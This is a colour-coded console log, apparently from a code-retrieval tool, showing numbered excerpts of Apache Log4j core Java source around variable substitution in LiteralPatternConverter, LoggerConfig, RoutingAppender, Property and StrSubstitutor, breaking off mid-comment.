[2;36m                    [0m         [1;36m69[0m[39m:        [0m[1;35moutput.append[0m[1;39m([0m[39msubstitute ? [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mliteral[0m[1;39m)[0m[39m : [0m         [2m                [0m
[2;36m                    [0m         [39mliteral[0m[1;39m)[0m[39m;[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:    public String [0m[1;35mgetLiteral[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:        return literal;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/LoggerConfig.jav[0m[1;92ma:356[0m[39m-[0m[1;36m366[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m356[0m[39m:            props = new ArrayList<Property>[0m[1;39m([0m[1;35mproperties.size[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                 [2m                [0m
[2;36m                    [0m         [1;36m357[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m358[0m[39m:            for [0m[1;39m([0m[39mfinal Map.Entry<Property, Boolean> entry : properties[0m          [2m                [0m
[2;36m                    [0m         [1;36m359[0m[39m:                    [0m[1;35m.entrySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m360[0m[39m:                final Property prop = [0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m361[0m[39m:                final String value = [0m[1;35mentry.getValue[0m[1;39m([0m[1;39m)[0m[39m ? [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m       [2m                [0m
[2;36m                    [0m         [1;36m362[0m[39m:                        [0m[1;35m.replace[0m[1;39m([0m[1;35mprop.getValue[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m : [0m[1;35mprop.getValue[0m[1;39m([0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m363[0m[39m:                [0m[1;35mprops.add[0m[1;39m([0m[1;35mProperty.createProperty[0m[1;39m([0m[1;35mprop.getName[0m[1;39m([0m[1;39m)[0m[39m, value[0m[1;39m)[0m[1;39m)[0m[39m;[0m      [2m                [0m
[2;36m                    [0m         [1;36m364[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m365[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m366[0m[39m:        final LogEvent event = [0m[1;35mlogEventFactory.createEvent[0m[1;39m([0m[39mloggerName, marker,[0m  [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/appender/routing/RoutingAppender.j[0m [2m                [0m
[2;36m                    [0m         [39mav[0m[1;92ma:109[0m[39m-[0m[1;36m119[0m                                                                         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:    @Override[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:    public void [0m[1;35mappend[0m[1;39m([0m[39mLogEvent event[0m[1;39m)[0m[39m [0m[1;39m{[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:        if [0m[1;39m([0m[39mrewritePolicy != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:            event = [0m[1;35mrewritePolicy.rewrite[0m[1;39m([0m[39mevent[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:        final String key = [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, [0m                    [2m                [0m
[2;36m                    [0m         [1;35mroutes.getPattern[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                                               [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:        final AppenderControl<T> control = [0m[1;35mgetControl[0m[1;39m([0m[39mkey, event[0m[1;39m)[0m[39m;[0m              [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:        if [0m[1;39m([0m[39mcontrol != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;35mcontrol.callAppender[0m[1;39m([0m[39mevent[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/LiteralPatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:1[0m[39m-[0m[1;36m21[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.pattern;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.Configuration;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/LiteralPatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:26[0m[39m-[0m[1;36m47[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:public final class LiteralPatternConverter extends LogEventPatternConverter [0m     [2m                [0m
[2;36m                    [0m         [39mimplements ArrayPatternConverter [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:     * String literal.[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:    private final String literal;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    private final Configuration config;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    private final boolean substitute;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Create a new instance.[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @param config The Configuration.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * @param literal string literal.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public [0m[1;35mLiteralPatternConverter[0m[1;39m([0m[39mfinal Configuration config, final String [0m     [2m                [0m
[2;36m                    [0m         [39mliteral[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        [0m[1;35msuper[0m[1;39m([0m[32m"Literal"[0m[39m, [0m[32m"literal"[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:        this.literal = literal;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:        this.config = config;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:        substitute = config != null && [0m[1;35mliteral.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/LiteralPatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:52[0m[39m-[0m[1;36m75[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder toAppendTo[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39msubstitute ? [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, literal[0m[1;39m)[0m [2m                [0m
[2;36m                    [0m         [39m: literal[0m[1;39m)[0m[39m;[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal Object obj, final StringBuilder output[0m[1;39m)[0m[39m [0m[1;39m{[0m           [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;35moutput.append[0m[1;39m([0m[39msubstitute ? [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mliteral[0m[1;39m)[0m[39m : [0m         [2m                [0m
[2;36m                    [0m         [39mliteral[0m[1;39m)[0m[39m;[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal StringBuilder output, final Object[0m[33m...[0m[39m objects[0m[1;39m)[0m[39m [0m[1;39m{[0m    [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:        [0m[1;35moutput.append[0m[1;39m([0m[39msubstitute ? [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mliteral[0m[1;39m)[0m[39m : [0m         [2m                [0m
[2;36m                    [0m         [39mliteral[0m[1;39m)[0m[39m;[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:    public String [0m[1;35mgetLiteral[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:        return literal;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/Property.jav[0m[1;92ma:1[0m[39m-[0m[1;36m77[0m          [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.config;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginAttr;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginFactory;[0m               [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginValue;[0m                 [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: * Represents a key/value pair in the configuration.[0m                             [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"property"[0m[39m, category = [0m[32m"Core"[0m[39m, printObject = true[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:public final class Property [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    private static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    private final String name;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    private final String value;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    private [0m[1;35mProperty[0m[1;39m([0m[39mfinal String name, final String value[0m[1;39m)[0m[39m [0m[1;39m{[0m                    [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:        this.name = name;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:        this.value = value;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * Returns the property name.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * @return the property name.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    public String [0m[1;35mgetName[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:        return name;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     * Returns the property value.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     * @return the value of the property.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:    public String [0m[1;35mgetValue[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:        return value;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     * Create a Property.[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:     * @param key The key.[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:     * @param value The value.[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:     * @return A Property.[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    @PluginFactory[0m                                                               [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:    public static Property [0m[1;35mcreateProperty[0m[1;39m([0m[39m@[0m[1;35mPluginAttr[0m[1;39m([0m[32m"name"[0m[1;39m)[0m[39m final String key,[0m  [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:                                          @[0m[1;35mPluginValue[0m[1;39m([0m[32m"value"[0m[1;39m)[0m[39m final String [0m    [2m                [0m
[2;36m                    [0m         [39mvalue[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        if [0m[1;39m([0m[39mkey == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:            [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Property key cannot be null"[0m[1;39m)[0m[39m;[0m                         [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:        return new [0m[1;35mProperty[0m[1;39m([0m[39mkey, value[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:    public String [0m[1;35mtoString[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:        return name + [0m[32m"="[0m[39m + value;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:700[0m[39m-[0m[1;36m850[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m700[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m701[0m[39m:     * Replaces all the occurrences of variables within the given source[0m        [2m                [0m
[2;36m                    [0m         [1;36m702[0m[39m:     * builder with their matching values from the resolver.[0m                    [2m                [0m
[2;36m                    [0m         [1;36m703[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m704[0m[39m:     * Only the specified portion of the builder will be processed.[0m             [2m                [0m
[2;36m                    [0m         [1;36m705[0m[39m:     * The rest of the builder is not processed, but it is not deleted.[0m         [2m                [0m
[2;36m                    [0m         [1;36m706[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m707[0m[39m:     * @param event   the current LogEvent, if one is present.[0m                  [2m                [0m
[2;36m                    [0m         [1;36m708[0m[39m:     * @param source  the builder to replace in, null returns zero[0m              [2m                [0m
[2;36m                    [0m         [1;36m709[0m[39m:     * @param offset  the start offset within the array, must be valid[0m          [2m                [0m
[2;36m                    [0m         [1;36m710[0m[39m:     * @param length  the length within the builder to be processed, must be [0m   [2m                [0m
[2;36m                    [0m         [39mvalid[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m711[0m[39m:     * @return true if altered[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m712[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m713[0m[39m:    public boolean [0m[1;35mreplaceIn[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder source, [0m [2m                [0m
[2;36m                    [0m         [39mfinal int offset, final int length[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m714[0m[39m:        if [0m[1;39m([0m[39msource == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m715[0m[39m:            return false;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m716[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m717[0m[39m:        return [0m[1;35msubstitute[0m[1;39m([0m[39mevent, source, offset, length[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m718[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m719[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m720[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m721[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m722[0m[39m:     * Internal method that substitutes the variables.[0m                          [2m                [0m
[2;36m                    [0m         [1;36m723[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m724[0m[39m:     * Most users of this class do not need to call this method. This method [0m   [2m                [0m
[2;36m                    [0m         [39mwill[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m725[0m[39m:     * be called automatically by another [0m[1;39m([0m[39mpublic[0m[1;39m)[0m[39m method.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m726[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m727[0m[39m:     * Writers of subclasses can override this method if they need access to[0m    [2m                [0m
[2;36m                    [0m         [1;36m728[0m[39m:     * the substitution process at the start or end.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m729[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m730[0m[39m:     * @param event The current LogEvent, if there is one.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m731[0m[39m:     * @param buf  the string builder to substitute into, not null[0m              [2m                [0m
